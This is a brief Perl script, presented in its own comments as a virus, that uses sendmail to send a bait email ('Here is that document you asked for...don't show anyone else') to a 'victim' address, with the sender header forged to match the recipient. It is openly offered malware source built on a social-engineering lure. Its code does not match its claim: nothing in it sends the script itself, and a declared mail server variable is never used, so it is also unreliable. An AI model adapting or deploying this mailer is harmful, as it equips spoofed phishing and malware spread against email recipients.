#!/usr/bin/perl
$MailTo = "victim@domain.com"; # the email address where the virus will send itself
$Subject = "Important Message"; # the subject of the email
$MessageBody = "Here is that document you asked for...don't show anyone else ;-)";
$MailServer = "mail.domain.com"; # the mail server to use for sending email
open(MAIL, "|/usr/sbin/sendmail -t");
print MAIL "To: $MailTo\n";
print MAIL "From: $MailTo\n";
print MAIL "Subject: $Subject\n\n";
print MAIL "$MessageBody\n";
close(MAIL);
